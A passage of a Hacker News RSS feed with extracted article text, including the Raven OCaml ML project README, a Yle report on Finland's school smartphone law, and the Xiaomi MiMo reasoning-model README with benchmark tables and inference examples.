<li><strong><a href="https://github.com/raven-ml/raven/blob/main/rune">Rune</a></strong>: Proof-of-concept stage.</li>
<li><strong><a href="https://github.com/raven-ml/raven/blob/main/quill">Quill</a></strong>: Early prototyping phase.</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">The Ecosystem</h2><a id="user-content-the-ecosystem" aria-label="Permalink: The Ecosystem" href="#the-ecosystem"></a></p>
<p dir="auto">Raven is a constellation of sub-projects, each addressing a specific aspect of the machine learning and data science workflow:</p>
<ul dir="auto">
<li><strong><a href="https://github.com/raven-ml/raven/blob/main/ndarray">Ndarray</a></strong>: The core of Raven, providing high-performance numerical computation with multi-device support (CPU, GPU), similar to NumPy but with OCaml's type safety.
<ul dir="auto">
<li><strong><a href="https://github.com/raven-ml/raven/blob/main/ndarray-cv">Ndarray-CV</a></strong>: A collection of computer vision utilities built on top of Ndarray.</li>
<li><strong><a href="https://github.com/raven-ml/raven/blob/main/ndarray-io">Ndarray-IO</a></strong>: A library for reading and writing Ndarray data in various formats.</li>
<li><strong><a href="https://github.com/raven-ml/raven/blob/main/ndarray-datasets">Ndarray-Datasets</a></strong>: Easy access to popular machine learning and data.
science datasets as Ndarrays.</li>
</ul>
</li>
<li><strong><a href="https://github.com/raven-ml/raven/blob/main/quill">Quill</a></strong>: An interactive notebook application for data exploration, prototyping, and knowledge sharing.</li>
<li><strong><a href="https://github.com/raven-ml/raven/blob/main/hugin">Hugin</a></strong>: A visualization library that produces publication-quality plots and charts.</li>
<li><strong><a href="https://github.com/raven-ml/raven/blob/main/rune">Rune</a></strong>: A library for automatic differentiation and JIT compilation, inspired by JAX.</li>
<li><strong>(More to come!)</strong>: Raven is an evolving ecosystem, and we have exciting plans for additional libraries and tools to make OCaml a premier choice for machine learning and data science.</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Python vs Raven: A Comparison</h2><a id="user-content-python-vs-raven-a-comparison" aria-label="Permalink: Python vs Raven: A Comparison" href="#python-vs-raven-a-comparison"></a></p>
<p dir="auto">The table below compares Python's popular data science libraries with their Raven counterparts. For detailed code examples, see the linked documentation files.</p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Task</th>
<th>Python Ecosystem</th>
<th>Raven Ecosystem</th>
<th>Comparison Guide</th>
<th>Examples</th>
</tr>
</thead>
<tbody>
<tr>
<td>Numerical Computing</td>
<td>NumPy</td>
<td><a href="https://github.com/raven-ml/raven/blob/main/ndarray">Ndarray</a></td>
<td><a href="https://github.com/raven-ml/raven/blob/main/docs/compare_python_ndarray.md">Comparison Guide</a></td>
<td><a href="https://github.com/raven-ml/raven/blob/main/ndarray/example">Examples</a></td>
</tr>
<tr>
<td>Visualization</td>
<td>Matplotlib, Seaborn</td>
<td><a href="https://github.com/raven-ml/raven/blob/main/hugin">Hugin</a></td>
<td><a href="https://github.com/raven-ml/raven/blob/main/docs/compare_python_hugin.md">Comparison Guide</a></td>
<td><a href="https://github.com/raven-ml/raven/blob/main/hugin/example">Examples</a></td>
</tr>
<tr>
<td>Notebooks</td>
<td>Jupyter</td>
<td><a href="https://github.com/raven-ml/raven/blob/main/quill">Quill</a></td>
<td>N/A</td>
<td>N/A</td>
</tr>
<tr>
<td>Automatic Differentiation</td>
<td>JAX</td>
<td><a href="https://github.com/raven-ml/raven/blob/main/rune">Rune</a></td>
<td><em>In progress</em></td>
<td><em>In progress</em></td>
</tr>
<tr>
<td>Dataframe Manipulation</td>
<td>Pandas</td>
<td><em>Not yet</em></td>
<td>N/A</td>
<td>N/A</td>
</tr>
<tr>
<td>Deep Learning</td>
<td>Pytorch, Tensorflow</td>
<td><em>Not yet</em></td>
<td>N/A</td>
<td>N/A</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto">We welcome contributions from everyone—whether you're an OCaml expert, a data scientist, or simply curious about the project:</p>
<ul dir="auto">
<li>Report issues for bugs or feature requests</li>
<li>Submit pull requests for code improvements, documentation, or examples</li>
</ul>
<p dir="auto">See our <a href="https://github.com/raven-ml/raven/blob/main/CONTRIBUTING.md">CONTRIBUTING.md</a> for detailed guidelines.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto">Raven is available under the <a href="https://github.com/raven-ml/raven/blob/main/LICENSE">ISC License</a>, making it free for both personal and commercial use.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Retailers will soon have only about 7 weeks of full inventories left (436 pts)]]></title>
            <link>https://fortune.com/article/retailers-weeks-of-inventory-left-trump-china-trade-war/</link>
            <guid>43843821</guid>
            <pubDate>Wed, 30 Apr 2025 11:42:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://fortune.com/article/retailers-weeks-of-inventory-left-trump-china-trade-war/">https://fortune.com/article/retailers-weeks-of-inventory-left-trump-china-trade-war/</a>, See on <a href="https://news.ycombinator.com/item?id=43843821">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-cy="article-wrapper" id="content" role="article"><p><img alt="Port of Los Angeles Executive Director Gene Seroka in 2024." data-content-placement="primary_image" fetchpriority="high" width="768" height="512" decoding="async" data-nimg="1" sizes="100vw" srcset="https://fortune.com/img-assets/wp-content/uploads/2025/04/GettyImages-1923252904-e1745942509982.jpg?w=320&amp;q=75 320w, https://fortune.com/img-assets/wp-content/uploads/2025/04/GettyImages-1923252904-e1745942509982.jpg?w=384&amp;q=75 384w, https://fortune.com/img-assets/wp-content/uploads/2025/04/GettyImages-1923252904-e1745942509982.jpg?w=480&amp;q=75 480w, https://fortune.com/img-assets/wp-content/uploads/2025/04/GettyImages-1923252904-e1745942509982.jpg?w=576&amp;q=75 576w, https://fortune.com/img-assets/wp-content/uploads/2025/04/GettyImages-1923252904-e1745942509982.jpg?w=768&amp;q=75 768w, https://fortune.com/img-assets/wp-content/uploads/2025/04/GettyImages-1923252904-e1745942509982.jpg?w=1024&amp;q=75 1024w, https://fortune.com/img-assets/wp-content/uploads/2025/04/GettyImages-1923252904-e1745942509982.jpg?w=1280&amp;q=75 1280w, https://fortune.com/img-assets/wp-content/uploads/2025/04/GettyImages-1923252904-e1745942509982.jpg?w=1440&amp;q=75 1440w" src="https://fortune.com/img-assets/wp-content/uploads/2025/04/GettyImages-1923252904-e1745942509982.jpg?w=1440&amp;q=75"></p><p>Port of Los Angeles Executive Director Gene Seroka in 2024.</p><p>Brittany Murray/MediaNews Group/Long Beach Press-Telegram via Getty Images</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Secret Deals, Foreign Investments: The Rise of Trump’s Crypto Firm (227 pts)]]></title>
            <link>https://www.nytimes.com/2025/04/29/us/politics/trump-crypto-world-liberty-financial.html</link>
            <guid>43843621</guid>
            <pubDate>Wed, 30 Apr 2025 11:19:40 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nytimes.com/2025/04/29/us/politics/trump-crypto-world-liberty-financial.html">https://www.nytimes.com/2025/04/29/us/politics/trump-crypto-world-liberty-financial.html</a>, See on <a href="https://news.ycombinator.com/item?id=43843621">Hacker News</a></p>
Couldn't get https://www.nytimes.com/2025/04/29/us/politics/trump-crypto-world-liberty-financial.html: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Finland Bans Smartphones in Schools (718 pts)]]></title>
            <link>https://yle.fi/a/74-20158886</link>
            <guid>43842856</guid>
            <pubDate>Wed, 30 Apr 2025 09:17:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://yle.fi/a/74-20158886">https://yle.fi/a/74-20158886</a>, See on <a href="https://news.ycombinator.com/item?id=43842856">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="yle__contentAnchor"><main><div data-testid="article-wrapper"><article data-vrsproduct="uutiset"><header><p>Pupils will be able to use their phones in some circumstances, but they will need to get permission from teachers.</p><figure><div><picture><source data-testid="source-for-S" media="(max-width: 767px)" srcset="https://images.cdn.yle.fi/image/upload/c_crop,h_2117,w_3764,x_704,y_600/ar_1.7777777777777777,c_fill,g_faces,h_431,w_767/dpr_2.0/q_auto:eco/f_auto/fl_lossy/v1717058943/39-1293569665832cf0572f 2x,https://images.cdn.yle.fi/image/upload/c_crop,h_2117,w_3764,x_704,y_600/ar_1.7777777777777777,c_fill,g_faces,h_431,w_767/dpr_1.0/q_auto:eco/f_auto/fl_lossy/v1717058943/39-1293569665832cf0572f 1x"><source data-testid="source-for-M" media="(min-width: 768px)" srcset="https://images.cdn.yle.fi/image/upload/c_crop,h_2117,w_3764,x_704,y_600/ar_1.7777777777777777,c_fill,g_faces,h_357,w_636/dpr_2.0/q_auto:eco/f_auto/fl_lossy/v1717058943/39-1293569665832cf0572f 2x,https://images.cdn.yle.fi/image/upload/c_crop,h_2117,w_3764,x_704,y_600/ar_1.7777777777777777,c_fill,g_faces,h_357,w_636/dpr_1.0/q_auto:eco/f_auto/fl_lossy/v1717058943/39-1293569665832cf0572f 1x"><img alt="Two red boxes filled with smartphones sitting on a table, as a sixth grader puts a device in one of the boxes." src="https://images.cdn.yle.fi/image/upload/c_crop,h_2117,w_3764,x_704,y_600/ar_1.7777777777777777,c_fill,g_faces,h_431,w_767/dpr_1.0/q_auto:eco/f_auto/fl_lossy/v1717058943/39-1293569665832cf0572f"></picture></div><figcaption><span>File photo.</span><span> <!-- -->Image: Mira Bäck / Yle</span></figcaption></figure><div><ul aria-label="Author"><li><span>Yle News</span></li></ul></div></header><section><p>Finnish Parliament voted on Tuesday to approve a law that restricts the use of mobile devices by pupils at primary and secondary schools.</p><p>The new rules are expected to come into force after the summer break, in August.</p><p>The law does not entirely ban the use of mobile phones at school, and their use will be permitted in certain situations. But generally, <a href="https://yle.fi/a/74-20134067" role="link">the use of phones during class time will be prohibited</a>.</p><p>Pupils will need to get special permission from teachers to use their phones, to assist them in studies, or to take care of personal health-related matters, for example.</p><p>The new law also gives school staff members the authority to confiscate mobile devices from pupils if they have caused teaching or learning disruptions.</p><p>Late last year, Education Minister <strong>Anders Adlercreutz</strong> (SPP) emphasised that kids' digital skills will still be supported despite the phone restrictions.</p><p><em><strong>Users with an Yle ID can leave comments on our news stories. You can create your Yle ID via</strong></em> <a href="https://yle.fi/aihe/yle-tunnus/yle-id" role="link"><em><strong>this link</strong></em></a><em><strong>. Our guidelines on commenting and moderation are explained</strong></em> <a href="https://yle.fi/aihe/s/discussion-policy" role="link"><em><strong>here</strong></em></a><em><strong>.</strong></em></p></section></article></div></main></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Xiaomi MiMo Reasoning Model (399 pts)]]></title>
            <link>https://github.com/XiaomiMiMo/MiMo</link>
            <guid>43842683</guid>
            <pubDate>Wed, 30 Apr 2025 08:48:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/XiaomiMiMo/MiMo">https://github.com/XiaomiMiMo/MiMo</a>, See on <a href="https://news.ycombinator.com/item?id=43842683">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><div dir="auto">
  <themed-picture data-catalyst-inline="true"><picture>
    <source srcset="https://github.com/XiaomiMiMo/MiMo/raw/main/figures/Xiaomi_MiMo_darkmode.png?raw=true" media="(prefers-color-scheme: dark)">
    <img src="https://github.com/XiaomiMiMo/MiMo/raw/main/figures/Xiaomi_MiMo.png?raw=true" width="60%" alt="Xiaomi-MiMo">
  </picture></themed-picture>
</div>
<p dir="auto"><h3 tabindex="-1" dir="auto">
  <b>
    <span>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
    <br>
    Unlocking the Reasoning Potential of Language Model<br>From Pretraining to Posttraining
    <br>
    <span>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
    <br>
  </b>
</h3><a id="user-content---------------unlocking-the-reasoning-potential-of-language-modelfrom-pretraining-to-posttraining--------------" aria-label="Permalink: ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    Unlocking the Reasoning Potential of Language ModelFrom Pretraining to Posttraining
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" href="#--------------unlocking-the-reasoning-potential-of-language-modelfrom-pretraining-to-posttraining--------------"></a></p>
<br>

<br>
<blockquote>
<p dir="auto">This code repository is licensed under the <a href="https://github.com/XiaomiMiMo/MiMo/blob/main/LICENSE">Apache2.0 License</a>.</p>
</blockquote>
<p dir="auto"><h2 tabindex="-1" dir="auto">I. Introduction</h2><a id="user-content-i-introduction" aria-label="Permalink: I. Introduction" href="#i-introduction"></a></p>
<p dir="auto">Currently, most successful RL works, including open-source research, rely on relatively large base models, e.g., 32B models, particularly for enhancing code reasoning capabilities. Moreover, it was widely considered that achieving uniform and simultaneous improvements in both mathematical and code capabilities within a small model is challenging. Nonetheless, we believe that the effectiveness of the RL trained reasoning model relies on the inherent reasoning potential of the base model. To fully unlock the reasoning potential of language models, efforts must focus not only on post-training but also on pre-training strategies tailored to reasoning.</p>
<p dir="auto">In this work, we present MiMo-7B, a series of models trained from scratch and born for reasoning tasks. Our RL experiments from MiMo-7B-Base show that our model possesses extraordinary reasoning potential, even surpassing much larger 32B models. Additionally, we perform RL training on a cold-started SFT model, resulting in MiMo-7B-RL, which demonstrates superior performance on both mathematics and code reasoning tasks, matching the performance of OpenAI o1-mini.</p>
<p dir="auto">
  <a target="_blank" rel="noopener noreferrer" href="https://github.com/XiaomiMiMo/MiMo/raw/main/figures/curve.png?raw=true"><img width="80%" src="https://github.com/XiaomiMiMo/MiMo/raw/main/figures/curve.png?raw=true"></a>
</p>
<p dir="auto">We open-source MiMo-7B series, including checkpoints of the base model, SFT model, RL model trained from base model, and RL model trained from the SFT model.
We believe this report along with the models will provides valuable insights to develop powerful reasoning LLM that benefit the larger community.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">🌟 Highlights</h3><a id="user-content--highlights" aria-label="Permalink: 🌟 Highlights" href="#-highlights"></a></p>
<ul dir="auto">
<li>
<p dir="auto"><strong>Pre-Training: Base Model Born for Reasoning</strong></p>
<ul dir="auto">
<li>We optimize data preprocessing pipeline, enhancing text extraction toolkits and applying multi-dimensional data filtering to increase reasoning pattern density in pre-training data. We also employ multiple strategies to generate massive diverse synthetic reasoning data.</li>
<li>We adopt a three-stage data mixture strategy for pre-training. Overall, MiMo-7B-Base is pre-trained on approximately 25 trillion tokens.</li>
<li>We incorporate Multiple-Token Prediction as an additional training objective, which enhances model performance and accelerates inference.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Post-Training Recipe: Pioneering Reasoning Model</strong></p>
<ul dir="auto">
<li>We curate 130K mathematics and code problems as RL training data, which can be verified by rule-based verifiers. Each problem undergoes careful cleaning and difficulty assessment to ensure quality. We employ only rule-based accuracy rewards to avoid potential reward hacking.</li>
<li>To mitigate the sparse reward issue for challenging code problems, we introduce a test difficulty driven code reward. By assigning fine-grained scores for test cases with varying difficulty levels, the policy can be more effectively optimized via dense reward signal.</li>
<li>We implement a data re-sampling strategy for easy problems to enhance rollout sampling efficiency and stabilize policy updates, particularly in the later phases of RL training.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>RL Infrastructures</strong></p>
<ul dir="auto">
<li>We develop a Seamless Rollout Engine to accelerate RL training and validation. Our design integrates continuous rollout, asynchronous reward computation, and early termination to minimize GPU idle time, achieving 2.29$\times$ faster training and 1.96$\times$ faster validation.</li>
<li>We support MTP in vLLM and enhance the robustness of the inference engine in RL system.</li>
</ul>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">II. Model Details</h2><a id="user-content-ii-model-details" aria-label="Permalink: II. Model Details" href="#ii-model-details"></a></p>
<blockquote>
<p dir="auto">Models are avaliable at <a href="https://huggingface.co/XiaomiMiMo" rel="nofollow">https://huggingface.co/XiaomiMiMo</a></p>
</blockquote>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th><strong>Model</strong></th>
<th><strong>Description</strong></th>
<th><strong>Download</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>MiMo-7B-Base</td>
<td>Base model with extraordinary reasoning potential</td>
<td><a href="https://huggingface.co/XiaomiMiMo/MiMo-7B-Base" rel="nofollow">🤗 XiaomiMiMo/MiMo-7B-Base</a></td>
</tr>
<tr>
<td>MiMo-7B-RL-Zero</td>
<td>RL model trained from base model</td>
<td><a href="https://huggingface.co/XiaomiMiMo/MiMo-7B-RL-Zero" rel="nofollow">🤗 XiaomiMiMo/MiMo-7B-RL-Zero</a></td>
</tr>
<tr>
<td>MiMo-7B-SFT</td>
<td>SFT model trained from base model</td>
<td><a href="https://huggingface.co/XiaomiMiMo/MiMo-7B-SFT" rel="nofollow">🤗 XiaomiMiMo/MiMo-7B-SFT</a></td>
</tr>
<tr>
<td>MiMo-7B-RL</td>
<td>RL model trained from SFT model, superior performance matching OpenAI o1-mini</td>
<td><a href="https://huggingface.co/XiaomiMiMo/MiMo-7B-RL" rel="nofollow">🤗 XiaomiMiMo/MiMo-7B-RL</a></td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto"><h2 tabindex="-1" dir="auto">III. Evaluation Results</h2><a id="user-content-iii-evaluation-results" aria-label="Permalink: III. Evaluation Results" href="#iii-evaluation-results"></a></p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Benchmark</th>
<th>GPT-4o-0513</th>
<th>Claude-3.5-Sonnet-1022</th>
<th>OpenAI o1-mini</th>
<th>QwQ-32B-Preview</th>
<th>R1-Distill-Qwen-14B</th>
<th>R1-Distill-Qwen-7B</th>
<th>MiMo-7B-RL</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>General</strong></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>GPQA Diamond<br>(Pass@1)</td>
<td>49.9</td>
<td>65.0</td>
<td>60.0</td>
<td>54.5</td>
<td>59.1</td>
<td>49.1</td>
<td>54.4</td>
</tr>
<tr>
<td>SuperGPQA<br>(Pass@1)</td>
<td>42.4</td>
<td>48.2</td>
<td>45.2</td>
<td>43.6</td>
<td>40.6</td>
<td>28.9</td>
<td>40.5</td>
</tr>
<tr>
<td>DROP<br>(3-shot F1)</td>
<td>83.7</td>
<td>88.3</td>
<td>83.9</td>
<td>71.2</td>
<td>85.5</td>
<td>77.0</td>
<td>78.7</td>
</tr>
<tr>
<td>MMLU-Pro<br>(EM)</td>
<td>72.6</td>
<td>78.0</td>
<td>80.3</td>
<td>52.0</td>
<td>68.8</td>
<td>53.5</td>
<td>58.6</td>
</tr>
<tr>
<td>IF-Eval<br>(Prompt Strict)</td>
<td>84.3</td>
<td>86.5</td>
<td>84.8</td>
<td>40.4</td>
<td>78.3</td>
<td>60.5</td>
<td>61.0</td>
</tr>
<tr>
<td><strong>Mathematics</strong></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MATH-500<br>(Pass@1)</td>
<td>74.6</td>
<td>78.3</td>
<td>90.0</td>
<td>90.6</td>
<td>93.9</td>
<td>92.8</td>
<td>95.8</td>
</tr>
<tr>
<td>AIME 2024<br>(Pass@1)</td>
<td>9.3</td>
<td>16.0</td>
<td>63.6</td>
<td>50.0</td>
<td>69.7</td>
<td>55.5</td>
<td>68.2</td>
</tr>
<tr>
<td>AIME 2025<br>(Pass@1)</td>
<td>11.6</td>
<td>7.4</td>
<td>50.7</td>
<td>32.4</td>
<td>48.2</td>
<td>38.8</td>
<td>55.4</td>
</tr>
<tr>
<td><strong>Code</strong></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>LiveCodeBench v5<br>(Pass@1)</td>
<td>32.9</td>
<td>38.9</td>
<td>53.8</td>
<td>41.9</td>
<td>53.1</td>
<td>37.6</td>
<td>57.8</td>
</tr>
<tr>
<td>LiveCodeBench v6<br>(Pass@1)</td>
<td>30.9</td>
<td>37.2</td>
<td>46.8</td>
<td>39.1</td>
<td>31.9</td>
<td>23.9</td>
<td>49.3</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto">MiMo-7B series</p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Benchmark</th>
<th>MiMo-7B-Base</th>
<th>MiMo-7B-RL-Zero</th>
<th>MiMo-7B-SFT</th>
<th>MiMo-7B-RL</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Mathematics</strong></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MATH500<br>(Pass@1)</td>
<td>37.4</td>
<td>93.6</td>
<td>93.0</td>
<td>95.8</td>
</tr>
<tr>
<td>AIME 2024<br>(Pass@1)</td>
<td>32.9</td>
<td>56.4</td>
<td>58.7</td>
<td>68.2</td>
</tr>
<tr>
<td>AIME 2025<br>(Pass@1)</td>
<td>24.3</td>
<td>46.3</td>
<td>44.3</td>
<td>55.4</td>
</tr>
<tr>
<td><strong>Code</strong></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>LiveCodeBench v5<br>(Pass@1)</td>
<td>32.9</td>
<td>49.1</td>
<td>52.3</td>
<td>57.8</td>
</tr>
<tr>
<td>LiveCodeBench v6<br>(Pass@1)</td>
<td>29.1</td>
<td>42.9</td>
<td>45.5</td>
<td>49.3</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<div dir="auto"><p dir="auto">Important</p><p dir="auto">The evaluation are conducted with <code>temperature=0.6</code>.</p>
<p dir="auto">AIME24 and AIME25 are with averaged score of 32 repetitions. LiveCodeBench v5 (20240801-20250201), LiveCodeBench v6 (20250201-20250501), GPQA-Diamond and IF-Eval are with averaged score of 8 repetitions. MATH500 and SuperGPQA are with a single run.</p>
</div>
<p dir="auto"><h2 tabindex="-1" dir="auto">IV. Deployment</h2><a id="user-content-iv-deployment" aria-label="Permalink: IV. Deployment" href="#iv-deployment"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">vLLM inference</h3><a id="user-content-vllm-inference" aria-label="Permalink: vLLM inference" href="#vllm-inference"></a></p>
<ol dir="auto">
<li>[Recommended] We official support inference with MiMo-MTP using <a href="https://github.com/XiaomiMiMo/vllm/tree/feat_mimo_mtp">our fork of vLLM</a>.</li>
</ol>
<p dir="auto">Example script</p>
<div dir="auto" data-snippet-clipboard-copy-content="from vllm import LLM, SamplingParams

model_path = &quot;/path/to/MiMo&quot;
llm = LLM(
    model=model_path,
    trust_remote_code=True,
    num_speculative_tokens=1,
    disable_log_stats=False
)
sampling_params = SamplingParams(temperature=0.6)

conversation = [
    {
        &quot;role&quot;: &quot;system&quot;,
        &quot;content&quot;: &quot;&quot;
    },
    {
        &quot;role&quot;: &quot;user&quot;,
        &quot;content&quot;: &quot;Write an essay about the importance of higher education.&quot;,
    },
]

outputs = llm.chat(conversation,
                   sampling_params=sampling_params,
                   use_tqdm=False)

for output in outputs:
    prompt = output.prompt
    generated_text = output.outputs[0].text
    print(f&quot;Prompt: {prompt!r}, Generated text: {generated_text!r}&quot;)

print(&quot;=&quot; * 80)"><pre><span>from</span> <span>vllm</span> <span>import</span> <span>LLM</span>, <span>SamplingParams</span>

<span>model_path</span> <span>=</span> <span>"/path/to/MiMo"</span>
<span>llm</span> <span>=</span> <span>LLM</span>(
    <span>model</span><span>=</span><span>model_path</span>,
    <span>trust_remote_code</span><span>=</span><span>True</span>,
    <span>num_speculative_tokens</span><span>=</span><span>1</span>,
    <span>disable_log_stats</span><span>=</span><span>False</span>
)
<span>sampling_params</span> <span>=</span> <span>SamplingParams</span>(<span>temperature</span><span>=</span><span>0.6</span>)

<span>conversation</span> <span>=</span> [
    {
        <span>"role"</span>: <span>"system"</span>,
        <span>"content"</span>: <span>""</span>
    },
    {
        <span>"role"</span>: <span>"user"</span>,
        <span>"content"</span>: <span>"Write an essay about the importance of higher education."</span>,
    },
]

<span>outputs</span> <span>=</span> <span>llm</span>.<span>chat</span>(<span>conversation</span>,
                   <span>sampling_params</span><span>=</span><span>sampling_params</span>,
                   <span>use_tqdm</span><span>=</span><span>False</span>)

<span>for</span> <span>output</span> <span>in</span> <span>outputs</span>:
    <span>prompt</span> <span>=</span> <span>output</span>.<span>prompt</span>
    <span>generated_text</span> <span>=</span> <span>output</span>.<span>outputs</span>[<span>0</span>].<span>text</span>
    <span>print</span>(<span>f"Prompt: <span><span>{</span><span>prompt</span>!r<span>}</span></span>, Generated text: <span><span>{</span><span>generated_text</span>!r<span>}</span></span>"</span>)

<span>print</span>(<span>"="</span> <span>*</span> <span>80</span>)</pre></div>
<ol start="2" dir="auto">
<li>Or, you can register a vLLM loader for MiMo without loading MTP parameters.</li>
</ol>
<p dir="auto">You can copy the <a href="https://github.com/XiaomiMiMo/MiMo/blob/main/registry/register_mimo_in_vllm.py"><code>registry/register_mimo_in_vllm.py</code></a> to your directory and import it with</p>
<div dir="auto" data-snippet-clipboard-copy-content="import register_mimo_in_vllm

from vllm import LLM, SamplingParams

model_path = &quot;/path/to/MiMo&quot;
llm = LLM(
    model=model_path,
    trust_remote_code=True,
    # num_speculative_tokens=1,
    disable_log_stats=False
)
sampling_params = SamplingParams(temperature=0.6)"><pre><span>import</span> <span>register_mimo_in_vllm</span>

<span>from</span> <span>vllm</span> <span>import</span> <span>LLM</span>, <span>SamplingParams</span>

<span>model_path</span> <span>=</span> <span>"/path/to/MiMo"</span>
<span>llm</span> <span>=</span> <span>LLM</span>(
    <span>model</span><span>=</span><span>model_path</span>,
    <span>trust_remote_code</span><span>=</span><span>True</span>,
    <span># num_speculative_tokens=1,</span>
    <span>disable_log_stats</span><span>=</span><span>False</span>
)
<span>sampling_params</span> <span>=</span> <span>SamplingParams</span>(<span>temperature</span><span>=</span><span>0.6</span>)</pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">HuggingFace inference</h3><a id="user-content-huggingface-inference" aria-label="Permalink: HuggingFace inference" href="#huggingface-inference"></a></p>
<p dir="auto">Example script</p>
<div dir="auto" data-snippet-clipboard-copy-content="from transformers import AutoModel, AutoModelForCausalLM, AutoTokenizer

model_path = &quot;/path/to/MiMo&quot;
model = AutoModelForCausalLM.from_pretrained(model_path, trust_remote_code=True)
tokenizer = AutoTokenizer.from_pretrained(model_path)
inputs = tokenizer([&quot;Today is&quot;], return_tensors='pt')
output = model.generate(**inputs, max_new_tokens = 100)
print(tokenizer.decode(output.tolist()[0]))"><pre><span>from</span> <span>transformers</span> <span>import</span> <span>AutoModel</span>, <span>AutoModelForCausalLM</span>, <span>AutoTokenizer</span>

<span>model_path</span> <span>=</span> <span>"/path/to/MiMo"</span>
<span>model</span> <span>=</span> <span>AutoModelForCausalLM</span>.<span>from_pretrained</span>(<span>model_path</span>, <span>trust_remote_code</span><span>=</span><span>True</span>)
<span>tokenizer</span> <span>=</span> <span>AutoTokenizer</span>.<span>from_pretrained</span>(<span>model_path</span>)
<span>inputs</span> <span>=</span> <span>tokenizer</span>([<span>"Today is"</span>], <span>return_tensors</span><span>=</span><span>'pt'</span>)
<span>output</span> <span>=</span> <span>model</span>.<span>generate</span>(<span>**</span><span>inputs</span>, <span>max_new_tokens</span> <span>=</span> <span>100</span>)
<span>print</span>(<span>tokenizer</span>.<span>decode</span>(<span>output</span>.<span>tolist</span>()[<span>0</span>]))</pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Recommended environment and prompts</h3><a id="user-content-recommended-environment-and-prompts" aria-label="Permalink: Recommended environment and prompts" href="#recommended-environment-and-prompts"></a></p>
<ul dir="auto">
<li>We recommend using <a href="https://github.com/XiaomiMiMo/vllm/tree/feat_mimo_mtp">our fork of vLLM</a> which is developed based on vLLM 0.7.3.</li>
<li>We recommend using empty system prompt.</li>
</ul>
<blockquote>
<p dir="auto">We haven't verified MiMo with other inference engines and welcome contributions based on the model definition in the Huggingface repo 💻.</p>
</blockquote>
<p dir="auto"><h2 tabindex="-1" dir="auto">V. Citation</h2><a id="user-content-v-citation" aria-label="Permalink: V. Citation" href="#v-citation"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="@misc{xiaomi2025mimo,
      title={MiMo: Unlocking the Reasoning Potential of Language Model – From Pretraining to Posttraining}, 
      author={{Xiaomi LLM-Core Team}},
      year={2025},
      primaryClass={cs.CL},
      url={https://github.com/XiaomiMiMo/MiMo}, 
}"><pre><span>@misc</span>{<span>xiaomi2025mimo</span>,
      <span>title</span>=<span><span>{</span>MiMo: Unlocking the Reasoning Potential of Language Model – From Pretraining to Posttraining<span>}</span></span>, 
      <span>author</span>=<span><span>{</span>{Xiaomi LLM-Core Team}<span>}</span></span>,
      <span>year</span>=<span><span>{</span>2025<span>}</span></span>,
      <span>primaryClass</span>=<span><span>{</span>cs.CL<span>}</span></span>,
      <span>url</span>=<span><span>{</span>https://github.com/XiaomiMiMo/MiMo<span>}</span></span>, 
}</pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">VI. Contact</h2><a id="user-content-vi-contact" aria-label="Permalink: VI. Contact" href="#vi-contact"></a></p>
<p dir="auto">Please contact us at <a href="mailto:mimo@xiaomi.com">mimo@xiaomi.com</a> or open an issue if you have any questions.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Leaderboard Illusion (151 pts)]]></title>
            <link>https://arxiv.org/abs/2504.20879</link>
            <guid>43842380</guid>
            <pubDate>Wed, 30 Apr 2025 07:58:24 GMT</pubDate>
